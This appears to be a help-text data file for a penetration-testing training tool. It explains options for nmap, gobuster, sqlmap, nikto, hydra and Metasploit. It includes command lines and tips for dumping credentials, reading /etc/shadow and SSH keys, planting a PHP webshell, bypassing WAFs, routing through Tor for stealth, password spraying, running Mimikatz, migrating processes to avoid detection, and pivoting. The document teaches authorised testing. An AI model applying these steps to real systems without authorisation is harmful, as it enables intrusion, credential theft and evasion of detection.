nmap.description: Network Mapper — the industry-standard tool for host discovery, port scanning, service/version detection, OS fingerprinting, and scripted vulnerability checks. The foundation of every professional recon phase.
nmap.teach_intro: Nmap works by sending carefully crafted packets to the target and analyzing the responses. Different port states (open, closed, filtered) give us a map of the attack surface. Every open port is a potential entry point.

-sV.label: Version Detection
-sV.desc: Probe open ports to determine service name and version. Essential — version info reveals CVEs.
-sV.teach:
Version detection sends extra probes after finding open ports. 'Apache 2.4.29' immediately points you to searchsploit and NVD.

Version detection — fingerprints exact software running on each port

-sC.label: Default Scripts
-sC.desc: Run Nmap's default NSE scripts. Grabs banners, enumerates services, checks for common vulns automatically.
-sC.teach:
NSE scripts are Lua programs that run against open ports. Default scripts do banner grabbing, SMB enumeration, FTP anonymous check, and more.

Default NSE scripts — runs common checks like SMB signing, HTTP headers

-sS.label: SYN Stealth Scan
-sS.desc: Half-open TCP scan. Never completes the handshake — faster and harder to detect.
-sS.teach:
SYN scan sends SYN, waits for SYN-ACK (open) or RST (closed). We never send the final ACK — leaves fewer logs.

SYN stealth scan — doesn't complete the handshake, harder to log

-sU.label: UDP Scan
-sU.desc: Scan UDP ports. Finds DNS (53), SNMP (161), TFTP (69), NTP (123) — often missed.
-sU.teach:
UDP is connectionless — no response usually means open|filtered. SNMP port 161 with 'public' community string is a goldmine.

UDP scan — finds DNS (53), SNMP (161), NTP (123)

-O.label: OS Detection
-O.desc: Identify the OS via TCP/IP fingerprinting. Narrows exploit selection dramatically.
-O.teach:
OS detection analyzes subtle packet response differences. Windows Server vs Ubuntu changes your entire attack path.

OS detection — guesses OS from TCP/IP fingerprint

-A.label: Aggressive Scan
-A.desc: OS detection + version + scripts + traceroute. All-in-one.
-A.teach:
-A is the Swiss Army knife. Louder but gives max intel in one shot. Great for CTFs and internal assessments.

Aggressive: OS detection + version + scripts + traceroute

-p-.label: All 65535 Ports
-p-.desc: Scan every port. Default only scans top 1000. Services on non-standard ports hide here.
-p-.teach:
Admins move services to weird ports thinking it's security. SSH on 2222, RDP on 3399, admin panel on 8888 — all missed without -p-.

All 65535 ports (slow but thorough — default only checks top 1000)

-p.label: Port Range
-p.desc: Specify exact ports or ranges: -p 22,80,443 or -p 1-1024
-p.teach: Targeted scanning is faster and quieter. Use when you know what services to expect.

--script.label: NSE Script
--script.desc: Run specific scripts: vuln, smb-vuln-ms17-010, http-title, ftp-anon, etc.
--script.teach:
smb-vuln-ms17-010 checks EternalBlue. ftp-anon checks anonymous FTP. http-enum finds web paths. Chain them: --script vuln,discovery

Run specific NSE scripts: --script smb-vuln-ms17-010

--top-ports.label: Top N Ports
--top-ports.desc: Scan N most commonly open ports. --top-ports 1000 covers 99% of real services.
--top-ports.teach: Nmap's port frequency database comes from real internet scans. Top 1000 covers ~99% of services in the wild.

-T4.label: Timing T4 (Fast)
-T4.desc: Aggressive timing for reliable networks. T0=paranoid to T5=insane.
-T4.teach:
T1-T2 for IDS evasion. T3 default. T4 for fast LAN. T5 can miss results. Never T5 in production.

Timing template (0-5), T4 = aggressive speed, good for labs

-oN.label: Normal Output File
-oN.desc: Save results to a human-readable file for your report.
-oN.teach: Always save output! -oN normal, -oX XML (for Metasploit import), -oG grepable, -oA all formats.

--open.label: Show Open Only
--open.desc: Only display open ports. Cleaner results on large subnet scans.
--open.teach:
Large subnet scans return hundreds of 'closed' results. --open filters noise so you only see actionable findings.

Only show open ports — cleaner output

-v.label: Verbose
-v.desc: Show results in real time as they're discovered.
-v.teach:
With -v you see open ports appear live. Start working on early discoveries while the scan continues.

Verbose — see what nmap is doing in real time

-p 80,443,22.label: -p 80,443,22
-p 80,443,22.teach: Specific ports only — fast for targeted checks

-Pn.label: -Pn
-Pn.teach: Skip host discovery — scan even if ICMP blocked

output_read.meaning: the port is accepting connections — investigate it
port exists but state unclear (firewall involved)
service VERSION tells you exactly what software to search for CVEs
YES/NO/VULNERABLE for specific checks
OS details may be wrong — it's a fingerprint guess, not a fact

nmap.teach_alt: Network scanner — maps hosts, ports, services, and vulnerabilities

gobuster.description: Directory, file, DNS subdomain, and vhost brute forcer. Threaded, fast, and wordlist-driven. One of the first tools to run against any web target after identifying HTTP/HTTPS ports.
gobuster.teach_intro: Gobuster sends HTTP requests for every word in your wordlist and records which ones get non-404 responses. It's fast because it runs dozens of threads simultaneously. Hidden directories, admin panels, backup files, and API endpoints all hide here.

dir.label: Directory Mode
dir.desc: Enumerate directories and files on a web server.
dir.teach:
dir mode is the workhorse. Finds /admin, /backup, /.git, /api — all the things devs forgot to protect.

Directory enumeration mode

dns.label: DNS Subdomain Mode
dns.desc: Enumerate subdomains by brute forcing DNS. Finds dev, staging, api, admin subdomains.
dns.teach:
DNS mode resolves each subdomain. dev.target.com might be running a debug build. mail.target.com reveals mail infra.

Subdomain enumeration: gobuster dns -d target.com -w wordlist.txt

vhost.label: Virtual Host Mode
vhost.desc: Enumerate virtual hosts on a web server. Finds hidden vhosts that don't appear in DNS.
vhost.teach:
Some vhosts only respond to the right Host: header. Internal admin panels often live as vhosts on the same IP.

Virtual host discovery (different sites on same IP)

-w.label: Wordlist
-w.desc: Path to wordlist. Use dirb/common.txt (small/fast) or dirbuster/directory-list-2.3-medium.txt (thorough).
-w.teach:
Wordlist choice matters. common.txt is 4600 words. medium.txt is 220k words. Start small, escalate.

Wordlist path

-t.label: Thread Count
-t.desc: Number of concurrent threads. Default 10, safe max ~50 for most servers.
-t.teach:
More threads = faster scan but more server load and more log entries. -t 10 is stealthy, -t 50 is aggressive.

Threads (default 10, use 30-50 for speed in labs)

-x.label: File Extensions
-x.teach:
Extensions unlock backup files. config.php.bak, admin.php, robots.txt.bak — devs leave these everywhere.

File extensions to append: -x php,html,txt,bak,zip

-s.label: Status Codes
-s.desc: Only show specific HTTP status codes. Default: 200,204,301,302,307,401,403.
-s.teach: 403 Forbidden means the path EXISTS but you're denied. A 403 is almost as interesting as a 200 — try bypass techniques.

-k.label: Skip TLS Verify
-k.desc: Skip SSL certificate verification. Required for self-signed certs on HTTPS targets.
-k.teach:
Most internal HTTPS services use self-signed certs. Without -k gobuster refuses to connect.

Skip TLS certificate verification

-o.label: Output File
-o.teach:
Always save output. You'll reference these paths for follow-up requests and report evidence.

Save output to file

--cookies.label: Session Cookies
--cookies.desc: Include cookies for authenticated scanning behind a login.
--cookies.teach: Without cookies gobuster only sees the unauthenticated surface. Add your session cookie to scan the post-login app.

--exclude-length.label: --exclude-length
--exclude-length.teach: Hide responses of specific lengths (filter noise)

output_read.meaning: directly accessible — investigate immediately
redirect, follow it — usually still accessible
forbidden but EXISTS — try bypass techniques
authentication required — credential attack opportunity
Large response sizes vs small may indicate different content — compare

gobuster.teach_alt: Directory/subdomain brute forcer — finds hidden paths and virtual hosts

sqlmap.description: The world's most powerful automated SQL injection detection and exploitation tool. Tests UNION-based, error-based, boolean-blind, time-based blind, and stacked query injection across 30+ database backends. After confirming injection, it can enumerate the entire database, dump tables, crack password hashes, read/write files on the server, and even execute OS commands. Used in over 80% of professional web application penetration tests.
sqlmap.teach_intro: SQL injection is when attacker-controlled input reaches a SQL query without being sanitized. The database executes the attacker's SQL alongside the application's SQL. There are 5 injection techniques SQLMap tests: UNION-based (fastest — appends a UNION SELECT to see data directly), Error-based (triggers database errors that leak data), Boolean-blind (asks true/false questions — 'is the first character of the password A?'), Time-based blind (uses SLEEP() to infer true/false — slowest but always works), Stacked queries (executes multiple statements — most powerful but DB-dependent). The exploitation chain is: find the injection point → confirm technique → enumerate databases → pick target DB → extract tables → dump users table → crack the hashes.

-u.label: Target URL
-u.desc: The URL with the injectable parameter. Include the parameter with a test value: ?id=1
-u.teach:
The URL must include the parameter you want to test. SQLMap fuzzes that parameter with injection payloads. Test multiple: -u 'http://target.com/page?id=1&cat=2' tests both id and cat. For POST forms use -u with --data instead. The ?id=1 value doesn't matter — SQLMap replaces it with payloads.

Target URL with injectable parameter

--batch.label: Non-interactive mode
--batch.desc: Accept all default answers automatically. Never prompts for input. Always use this.
--batch.teach:
Without --batch, SQLMap constantly asks: 'Do you want to skip other tests? Do you want to exploit? Do you want to crack hashes?' On any real assessment you want --batch so it runs continuously. Only remove --batch during manual analysis when you want to control each decision.

Auto-answer all prompts (non-interactive)

--dbs.label: Enumerate all databases
--dbs.desc: List all databases on the server after confirming injection.
--dbs.teach:
After confirming injection, --dbs shows every database. You'll see: information_schema (MySQL metadata — skip it), performance_schema (more metadata — skip it), and the actual application databases. Look for: wordpress, customers, users, accounts, hr, finance, payroll. Pick one and move to --tables.

Enumerate all databases

--tables.label: List tables in a database
--tables.desc: List all tables inside a specific database. Always combine with -D.
--tables.teach:
After picking a database, drill in with -D dbname --tables. Priority targets: users, wp_users, accounts, admin, login, passwords, customer_data, employees, credentials. Each is a potential credential dump. Pick the most interesting table and move to --dump.

Enumerate tables: -D dbname --tables

--columns.label: List columns in a table
--columns.desc: Show all column names and data types in a specific table.
--columns.teach: Before dumping, check columns to understand table structure. You want: username, password, email, user_pass, password_hash. Skip: profile_image, description, last_login_timestamp — large fields with low intelligence value. Knowing exact column names lets you use -C to dump only what matters.

--dump.label: Dump table contents
--dump.desc: Extract all data from a specific table. Combine with -D and -T.
--dump.teach:
This is where SQL injection becomes critical-severity. --dump extracts every row. If it finds hashed passwords, SQLMap offers to crack them with a dictionary — say yes. Many weak passwords crack immediately. Full chain: --dbs → -D db --tables → -D db -T table --dump → you have credentials.

Dump table data: -D db -T users --dump

--dump-all.label: Dump everything
--dump-all.desc: Extract ALL tables from ALL databases in one operation.
--dump-all.teach: --dump-all is the nuclear option. Add --exclude-sysdbs to skip information_schema and performance_schema. This produces a complete dump of the entire application database. Extremely loud — thousands of queries over several minutes. Use only when you have confirmed injection and need comprehensive evidence for the report.

-D.label: Target database
-D.desc: Specify which database to work with.
-D.teach: Always specify -D after running --dbs. Without -D, some commands run against all databases which is slow and noisy. -D narrows focus to the database that matters. Case-sensitive on MySQL.

-T.label: Target table
-T.teach: Use -T after --tables to target a specific table for --columns or --dump. Combine with -C to extract only specific columns: -D db -T users -C username,password --dump

-C.label: Target columns
-C.desc: Specify which columns to extract — avoids dumping huge irrelevant fields.
-C.teach: Targeting specific columns dramatically speeds up dumps and reduces noise. Once you know column names from --columns, pick only: username, password, email, ssn, credit_card — the high-value fields. Skip large binary columns.

--level.label: Test depth (1-5)
--level.desc: How many tests per parameter. 1=URL params only, 3=cookies too, 5=everything including HTTP headers and User-Agent.
--level.teach:
Level 1 = URL parameters only (fastest, least noise). Level 2 = URL + Cookie. Level 3 = URL + Cookie + Referer header. Level 4-5 = adds User-Agent, X-Forwarded-For and more. Many web apps inject cookie values directly into queries — Level 2+ catches these. Level 5 tests everything but is very slow.

Test depth 1-5 (default 1, use 3+ for more vectors)

--risk.label: Payload aggressiveness (1-3)
--risk.desc: Risk 1=safe tests only, 2=OR-based, 3=UPDATE/DELETE payloads (can modify data).
--risk.teach:
Risk 1 = tests that can't damage data. Risk 2 = adds OR-based time injections. Risk 3 = adds UNION SELECT inside UPDATE statements — these can actually modify database records. NEVER use --risk=3 on production systems you haven't been authorized to test destructively.

Risk level 1-3 (higher = more aggressive, possible data modification)

--technique.label: Injection technique
--technique.desc: Specify which techniques: B=boolean-blind, E=error-based, U=UNION, S=stacked, T=time-based.
--technique.teach: U (UNION) is fastest and most visible. T (time-based) is slowest but works when output is not visible. B (boolean-blind) works without output — sends 'AND 1=1' vs 'AND 1=2' and compares responses. E (error-based) relies on verbose database errors — often blocked in production. Start with --technique=BEU and fall back to T if nothing else works.

--forms.label: Auto-test all HTML forms
--forms.desc: Automatically find and test all HTML forms on the target page.
--forms.teach:
Instead of manually crafting --data strings, --forms parses the page HTML and tests every form field automatically. Catches login forms, search boxes, contact forms, registration forms. Much faster than manually constructing POST requests for each form.

Auto-detect and test HTML forms

--data.label: POST body data
--data.desc: Send HTTP POST request with parameters in the body. Mark injectable parameter with *.
--data.teach:
For POST forms, capture the request in Burp Suite, copy the POST body, pass it to --data. SQLMap tests every parameter. Mark specific parameters with *: --data='username=admin*&password=test' tests only username. Critical for testing login forms, API endpoints, and search functions that use POST.

POST data: --data='user=test&pass=test'

--cookie.label: Session cookie
--cookie.desc: Include a session cookie to test injection points behind authentication.
--cookie.teach:
Many critical injection points are behind login pages. Log in manually, copy the session cookie from Developer Tools → Network → Request Headers, paste it with --cookie. Now SQLMap tests the authenticated surface — where the real sensitive data lives. Also use when the injection point IS in the cookie value itself (combine with --level=2).

Session cookie: --cookie='PHPSESSID=abc123'

--os-shell.label: OS command shell
--os-shell.desc: Attempt to get an interactive OS shell through the database server.
--os-shell.teach:
The ultimate SQL injection escalation. Works when: MySQL running as root with FILE privilege, MSSQL running as sa, or PostgreSQL with COPY TO PROGRAM support. SQLMap writes a webshell to the web root (MySQL) or uses xp_cmdshell (MSSQL). --os-shell gives you a real command prompt on the database server OS. This is full server compromise through a web vulnerability.

Get OS shell (requires FILE privilege on DB user)

--file-read.label: Read server files
--file-read.desc: Read files from the database server filesystem (requires FILE privilege).
--file-read.teach:
MySQL with FILE privilege can read any file: /etc/passwd, /var/www/html/config.php (database credentials!), /home/user/.ssh/id_rsa (SSH keys), /etc/shadow. Database config files almost always contain credentials reused elsewhere. This alone is often critical-severity evidence even without a full dump.

Read server file: --file-read=/etc/passwd

--file-write.label: Write files to server
--file-write.desc: Write files to the database server filesystem — write a PHP webshell for RCE.
--file-write.teach: Writing a PHP webshell to the web root = Remote Code Execution. SQLMap writes your local file (--file-write) to the server path (--file-dest). If MySQL has write permission to the web directory, you get a persistent webshell. This converts SQLi to RCE in one step. Always remove the webshell in the remediation phase of the engagement.

--tamper.label: WAF bypass tamper scripts
--tamper.desc: Apply obfuscation scripts to bypass Web Application Firewalls. Chain multiple with commas.
--tamper.teach:
WAF bypass tamper scripts: space2comment replaces spaces with /**/ (bypasses space-based filters). between adds comment between SQL keywords. charencode URL-encodes payload characters. randomcase randomly changes case (bypasses case-sensitive rules). Run multiple — each applies in order. Start with space2comment and between — catches 60% of WAFs. Add randomcase for case-sensitive rules.

Bypass WAF: --tamper=space2comment,randomcase

--random-agent.label: Random browser User-Agent
--random-agent.desc: Use a random real browser User-Agent on each request to evade WAF detection.
--random-agent.teach: SQLMap's default User-Agent 'sqlmap/X.X.X' is immediately flagged by any WAF. --random-agent picks a random real browser UA: Chrome, Firefox, Safari, Edge. Combine with --delay=1 to look like a slow human browser instead of an automated tool.

--delay.label: Delay between requests
--delay.desc: Wait N seconds between each HTTP request to evade rate limiting.
--delay.teach: Rate limiting and WAF detection look for high-speed request floods. --delay=1 adds 1 second between requests — slow enough to look human, fast enough to complete the scan. Combine with --random-agent for maximum stealth. For very aggressive WAFs: --delay=3 --random-agent --tamper=space2comment.

--proxy.label: Route through proxy
--proxy.desc: Send all SQLMap traffic through Burp Suite for inspection or Tor for anonymity.
--proxy.teach: Routing through Burp Suite lets you see exactly what SQLMap sends and intercept/modify requests — excellent for learning why a payload isn't working. For anonymity, route through Tor: --proxy=socks5://127.0.0.1:9050. Add --check-tor to verify Tor connectivity before launching.

--passwords.label: Dump database user passwords
--passwords.desc: Extract database-level user credentials and hashes.
--passwords.teach: Database users (MySQL root, MSSQL sa) have their own password hashes separate from application users. DBA accounts often use passwords reused on other systems. Cracking these hashes with hashcat may give you access to other databases, the server OS, or other infrastructure.

--dbms.label: Specify database type
--dbms.desc: Tell SQLMap the target database: MySQL, MSSQL, PostgreSQL, Oracle, SQLite.
--dbms.teach: If you know the database type from Nmap (-sV shows MySQL 8.0) or error messages, set --dbms to skip fingerprinting tests. Speeds up injection detection significantly. Each DBMS has different OS execution paths: MSSQL uses xp_cmdshell, PostgreSQL uses COPY TO PROGRAM, MySQL uses INTO OUTFILE. Knowing the DBMS changes your attack path.

--tor.label: Route via Tor
--tor.desc: Route all SQLMap traffic through the Tor network for source IP anonymity.
--tor.teach:
Tor routes through multiple encrypted relays making source IP attribution very difficult. Add --check-tor to verify Tor is actually working before launching. Significantly slower than direct connection. For maximum stealth: --tor + --delay=2 + --random-agent + --tamper=space2comment.

Route through Tor (slow but anonymous)

--crawl.label: --crawl
--crawl.teach: Spider the site and test all found parameters: --crawl=3

output_read.meaning: we can extract data with UNION SELECT
true/false responses — slower data extraction
inferring data by response delay — very slow
everything accessible with the DB user's permissions
Check the dump for password hashes — run them through hashcat next

sqlmap.teach_alt: Automated SQL injection scanner and exploiter

nikto.description: Web server vulnerability scanner. Tests for 6700+ potentially dangerous files, outdated server software, version-specific problems, and server configuration issues. Fast passive reconnaissance against any HTTP/HTTPS target.
nikto.teach_intro: Nikto checks web servers against a database of known vulnerabilities, dangerous files, and misconfigurations. It's noisy but thorough — every '+' line in the output is a potential finding. Think of it as the first scanner you run against a web target before going deeper.

-h.label: Target Host
-h.desc: Target hostname or IP. Add port with -p if not 80/443.
-h.teach:
Every scan starts here. Nikto will probe the host on port 80 by default. Add -ssl for HTTPS.

Target host or URL

-p.label: Port
-p.desc: Specify port number if not default 80/443.
-p.teach:
Many apps run on 8080, 8443, 8888, or 9000. Always specify the correct port or you'll scan the wrong service.

Specify port: -p 8080

-ssl.label: Force SSL/HTTPS
-ssl.desc: Force SSL connection. Use for HTTPS targets.
-ssl.teach:
Without -ssl on an HTTPS target nikto will fail to connect. Always pair with HTTPS targets.

Force HTTPS/SSL testing

-Tuning.label: Scan Tuning
-Tuning.teach:
Tuning lets you focus on specific vulnerability classes. -Tuning 4 only tests injection points. Reduces noise for targeted recon.

Only run certain test types: -Tuning 1 (interesting files)

-o.label: Output File
-o.desc: Save results. Format detected by extension: .txt .html .xml .csv
-o.teach:
HTML output is easiest to read and share. XML output can be imported into other tools.

Save output: -o nikto_results.txt

-Format.label: Output Format
-Format.desc: Explicitly set output format: htm, csv, txt, xml, msf+.
-Format.teach:
msf+ format outputs Metasploit resource script — auto-feeds findings into MSF for exploitation.

Output format: txt, csv, htm, xml

-evasion.label: IDS Evasion
-evasion.desc: Evasion techniques: 1=random URI encoding, 2=dir self-ref, 3=premature URL ending.
-evasion.teach: Evasion techniques mangle requests to bypass IDS signatures. Not reliable against modern WAFs but useful against legacy systems.

-id.label: Authentication
-id.teach:
If the target uses HTTP Basic Auth, supply credentials with -id. Without this you only see the unauthenticated surface.

Authentication: -id user:password

-useproxy.label: Use Proxy
-useproxy.teach:
Routing through Burp Suite lets you see exactly what Nikto sends and intercept/replay interesting requests.

Route through proxy (Burp): -useproxy http://127.0.0.1:8080

-timeout.label: Timeout
-timeout.desc: Seconds before giving up on a request. Default 10.
-timeout.teach: Slow servers or high latency targets need a higher timeout. Too low and you miss findings.

output_read.meaning: Nikto found something — every line starting with + is a finding
clickjacking risk
Server: header reveals software version — check it in CVE databases
OSVDB numbers are old — cross-reference with CVE.mitre.org
False positives are common — verify every finding manually

nikto.teach_alt: Web vulnerability scanner — checks for 6,700+ known issues

hydra.description: Fast and flexible online password brute forcing tool. Supports 50+ protocols: SSH, FTP, HTTP, SMTP, SMB, RDP, MySQL, PostgreSQL, VNC, and more. The industry standard for credential attacks against network services.
hydra.teach_intro: Hydra works by trying username/password combinations against a live service as fast as the network allows. It's online brute forcing — you need network access to the target. Results mean valid live credentials you can use right now. Always have permission before running this.

-l.label: Single Username
-l.teach:
Start with common admin usernames: admin, root, administrator, user, test. Often one hits.

Single username: -l admin

-L.label: Username List
-L.desc: Test a list of usernames from file: -L users.txt
-L.teach:
Get usernames from OSINT (LinkedIn, email harvesting), LDAP enumeration, or default credential lists.

Username list file: -L users.txt

-p.label: Single Password
-p.desc: Test a single password against all usernames. Good for password spray.
-p.teach:
Password spray: try one common password against many accounts. Avoids lockouts. 'Password1!', 'CompanyName2024!' are typical hits.

Single password: -p password123

-P.label: Password List
-P.teach:
rockyou.txt has 14 million real-world leaked passwords. Most people use passwords that appear in it.

Password list: -P rockyou.txt

-t.label: Threads
-t.desc: Parallel tasks per target host. Default 16.
-t.teach:
SSH limits connections and may lockout accounts. Use -t 4 for SSH to avoid triggering fail2ban. HTTP can handle -t 64.

Parallel tasks per target (default 16, use 4 for SSH to avoid lockout)

-f.label: Stop on First Hit
-f.desc: Stop attacking when the first valid credential is found.
-f.teach:
-f saves time and reduces noise once you have working creds. Always use -f in real engagements.

Stop on first valid credential

-s.label: Custom Port
-s.desc: Specify non-standard port: -s 2222 for SSH on port 2222.
-s.teach:
SSH moved to 2222, HTTP on 8080, FTP on 2121 — always check with nmap first then set the right port.

Custom port: -s 2222

-V.label: Verbose Mode
-V.desc: Show every login attempt. Verbose output for monitoring progress.
-V.teach:
Verbose mode shows each attempt: [22][ssh] host: ... login: admin password: test. Good for watching live progress.

Very verbose (every attempt — very noisy)

-o.label: Output File
-o.desc: Save found credentials to a file.
-o.teach:
Always save credentials. You'll need them for your report, and to reuse across other services on the network.

Save found credentials to file

-e.label: Extra Checks
-e.desc: Try: n=null password, s=same as login, r=reversed login.
-e.teach: -e nsr checks empty password, password=username, and reversed username. Catches lazy admins fast.

-x.label: Password Generator
-x.desc: Generate passwords on the fly: -x MIN:MAX:CHARSET
-x.teach: Generates all combos of lowercase+uppercase+digits between 4-6 chars. For PIN brute force: -x 4:4:1234567890

-C.label: Colon-Separated File
-C.desc: Use user:pass format file instead of separate -L and -P.
-C.teach:
Default credential lists in user:pass format are perfect for -C. admin:admin, root:toor, admin:password.

Colon-separated credentials: -C creds.txt (user:pass per line)

output_read.meaning: config — verify target/protocol are correct before waiting
speed — if very slow, reduce threads or check connectivity
valid credential found — stop and test it
service isn't running on that port
reduce -t (thread count)

hydra.teach_alt: Network login brute forcer supporting 50+ protocols

metasploit.description: The world's most widely used penetration testing framework. Contains 2000+ exploits, 500+ auxiliary modules, 300+ payloads, and 200+ post-exploitation modules. Used by every professional red team and penetration tester on the planet. Integrates with Nmap, Nessus, Nexpose, and Burp Suite. Free, open-source, and more capable than commercial tools costing tens of thousands of dollars.
metasploit.teach_intro: Metasploit has four module types you must understand: EXPLOITS take advantage of a vulnerability to execute code on the target. PAYLOADS are what runs after the exploit succeeds — your backdoor, your shell, your Meterpreter agent. AUXILIARIES are everything else: scanners, fuzzers, brute forcers, sniffers. POST modules run after you have a session to escalate privileges, dump credentials, pivot, and persist. The workflow is always: search → use → show options → set → run. LHOST is always YOUR IP. RHOSTS is always the TARGET.

-q.label: Quiet — no banner
-q.desc: Start without the ASCII art banner. Clean output for professional work.
-q.teach: Always use -q in real engagements. The banner wastes time and makes screenshots look amateur. First command after launching: db_status to verify the PostgreSQL database is connected. Without DB, MSF loses host/service tracking.

-x.label: Execute on startup
-x.desc: Run MSF console commands automatically at launch. Chain with semicolons.
-x.example: msfconsole -q -x 'use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS 192.168.1.0/24; set THREADS 10; run'
-x.teach: -x is how you automate MSF. Write your full attack chain as a -x string or put it in a .rc file with -r. Perfect for running the same scanner across multiple engagements without manual setup.

-r.label: Resource script
-r.desc: Execute a .rc file of MSF commands line by line on startup.
-r.teach: Resource scripts (.rc files) are your automation superpower. Create recon.rc with: db_import nmap.xml; use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS file:/tmp/hosts.txt; run. Saves hours on large engagements.

search.label: Search modules
search.desc: Find exploits and modules by keyword, CVE, platform, type, or rank.
search.teach:
Search filters: type: (exploit/auxiliary/post/payload), platform: (windows/linux/osx/android), rank: (excellent/great/good/normal), cve: (CVE number), name: (module name). 'search rank:excellent type:exploit platform:windows' gives you the most reliable Windows exploits. Rank matters: excellent means reliable, normal means it might crash the service.

search ms17-010 — find modules by CVE, name, or platform

use.label: Load a module
use.desc: Select a module by full path or result number from search.
use.teach:
After search, you can type 'use 0' to use the first result. Always follow with 'info' to read the module description and 'show options' to see required settings. Required options (marked Required: yes) MUST be set before running.

use exploit/windows/smb/ms17_010_eternalblue

info.label: Module information
info.desc: Show full details about the loaded module including description, options, targets, and references.
info.teach:
Info shows you everything: what vulnerability the module exploits, which OS versions are vulnerable, the CVE number, references to exploit-db and research papers, and reliability notes. Read this before every exploitation attempt.

info — show module description, options, and targets

show options.label: Show required settings
show options.desc: Display all configurable options for the current module — required and optional.
show options.teach:
The output shows: Name, Current Setting, Required (yes/no), Description. Everything marked Required: yes with no value MUST be set. Common required options: RHOSTS (target), LHOST (your IP for reverse shells), PAYLOAD. Run 'show options' after every 'set' command to confirm values saved.

show required and optional parameters

show payloads.label: List compatible payloads
show payloads.desc: Show all payloads compatible with the current exploit module.
show payloads.teach: Payload naming is systematic: OS/arch/type/connection_method. windows/x64/meterpreter/reverse_tcp = Windows 64-bit, Meterpreter session, calls back to you over TCP. 'staged' (/) downloads shellcode in two stages — smaller initial payload. 'stageless' (_) is self-contained — works when outbound is filtered. Meterpreter > cmd shell always — more features, encrypted, fileless.

set.label: Configure option
set.desc: Set module options: RHOSTS (target), LHOST (your IP), LPORT (listen port), PAYLOAD, THREADS.
set.example:
set RHOSTS 192.168.1.0/24
set LHOST 10.10.10.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set THREADS 10
set.teach: Critical settings: RHOSTS accepts single IPs, ranges (192.168.1.1-50), CIDR (192.168.1.0/24), or files (file:/tmp/hosts.txt). LHOST must be YOUR IP reachable from the target — not 127.0.0.1. If pivoting through a compromised machine, LHOST is that machine's IP. 'setg' sets a value globally for all modules in the session.

run.label: Execute the module
run.desc: Launch the configured module. 'exploit' is identical. -j runs as background job.
run.teach: 'run' and 'exploit' are the same command. Add -j to run as a background job so you can keep using the console. After a successful exploit you see 'Meterpreter session X opened' — type 'sessions -i X' to interact. If it fails: check RHOSTS, verify the target is actually vulnerable (run the scanner first), check firewall rules.

check.label: Check if target is vulnerable
check.desc: Test if the target is vulnerable without actually exploiting it. Not all modules support this.
check.teach: Check sends probe packets to determine vulnerability without exploiting. Useful for client-facing reports — 'we verified vulnerability without exploitation'. Not all modules implement check — many require you to use a dedicated scanner auxiliary instead.

db_import.label: Import Nmap scan
db_import.desc: Import Nmap XML output into MSF's PostgreSQL database.
db_import.teach: This is the critical workflow: run nmap -sV -oX scan.xml first, then db_import it into MSF. After import: 'hosts' shows all discovered systems, 'services' shows all open ports/services, 'vulns' shows scanner-confirmed vulnerabilities. MSF then lets you run exploits directly against database entries with 'set RHOSTS' plus the host reference.

vulns.label: Show vulnerabilities
vulns.desc: List all vulnerabilities discovered and logged in the MSF database.
vulns.teach: Vulnerabilities get added to the DB when you run scanner auxiliaries (smb_ms17_010, mysql_login, etc.). Each vuln entry shows: host, name, references, proof. This becomes your exploitation checklist. Cross-reference with 'search cve:XXXX-XXXX' to find the exploit module.

sessions.label: Manage sessions
sessions.desc: List, interact with, and kill active Meterpreter/shell sessions.
sessions.teach:
sessions -l lists all open connections with ID, type, tunnel, and connection time. sessions -i 1 drops into that session. sessions -u 1 tries to UPGRADE a basic shell to Meterpreter — huge quality-of-life improvement. sessions -K kills all sessions. You can have 50+ sessions open simultaneously — route pivoting through them.

List active Meterpreter sessions

background.label: Background active session
background.desc: Return to msfconsole while keeping the current session alive.
background.teach:
Ctrl+Z or type 'background' to return to msfconsole with the session still running. The session stays active indefinitely. Use this to run post-exploitation modules: 'use post/windows/gather/hashdump; set SESSION 1; run'. Post modules extract hashes, keyloggers, screenshots, and more from backgrounded sessions.

Background current session (Ctrl+Z)

hashdump.label: Meterpreter: dump password hashes
hashdump.desc: From Meterpreter session: dump Windows SAM password hashes.
hashdump.teach:
hashdump extracts all local Windows password hashes from the SAM database. Requires SYSTEM privileges — run getsystem first if you only have admin. Output: username:RID:LM_hash:NT_hash. Take the NT hash (last field) to hashcat: -m 1000 for NTLM. Or pass-the-hash with crackmapexec.

Dump password hashes from SAM

getsystem.label: Meterpreter: escalate to SYSTEM
getsystem.desc: Attempt to elevate from Administrator to SYSTEM using 3 different techniques.
getsystem.teach:
getsystem tries: named pipe impersonation, token duplication, and service exploitation. SYSTEM is more powerful than Administrator — it can access LSASS for credential dumping. If getsystem fails, try: use post/multi/recon/local_exploit_suggester to find local privilege escalation exploits.

Attempt privilege escalation to SYSTEM

getuid.label: Meterpreter: current user
getuid.desc: Show which user account the Meterpreter session is running as.
getuid.teach: Always check getuid after gaining a session. NT AUTHORITY\SYSTEM = full control. DOMAIN\Administrator = domain admin. DOMAIN\low_priv_user = need to escalate. Your privilege level determines what post-exploitation is possible.

sysinfo.label: Meterpreter: system information
sysinfo.desc: Show OS version, hostname, architecture, and domain of the compromised system.
sysinfo.teach: Sysinfo gives you: computer name (useful for AD enumeration), OS + build number (for unpatched exploit search), architecture (x86 vs x64 matters for payload compatibility), domain name (confirms you're in a domain environment). Note the OS build — searchsploit 'windows build_number' finds local exploits.

migrate.label: Meterpreter: process migration
migrate.desc: Move Meterpreter into another running process for stability and stealth.
migrate.teach: Migrating into explorer.exe or svchost.exe makes Meterpreter much harder to detect and survive process crashes. If you're in a cmd.exe or powershell.exe that the user might close, migrate first. migrate -N explorer.exe finds and migrates by process name. Some post modules require migration to a specific process (e.g., keylogging needs explorer.exe).

load kiwi.label: Meterpreter: load Kiwi (Mimikatz)
load kiwi.desc: Load the Kiwi extension which wraps Mimikatz for credential extraction.
load kiwi.teach: Kiwi is Mimikatz built into Meterpreter. After 'load kiwi': creds_all dumps everything at once (plaintext passwords, NTLM hashes, Kerberos tickets), lsa_dump_sam gets SAM hashes, lsa_dump_secrets gets LSA secrets including service account passwords. Requires SYSTEM or debug privilege. Often catches plaintext passwords for recently logged-in domain users.

portfwd.label: Meterpreter: port forwarding
portfwd.desc: Forward local port through the Meterpreter session to access internal services.
portfwd.teach: Port forwarding turns the compromised machine into a proxy. portfwd add -l 13389 -p 3389 -r INTERNAL_IP lets you RDP to an internal machine through your session: rdesktop 127.0.0.1:13389. This is how you access services on network segments you can't reach directly. The -l is your local port, -p is the target port, -r is the target IP.

route.label: Session routing / pivoting
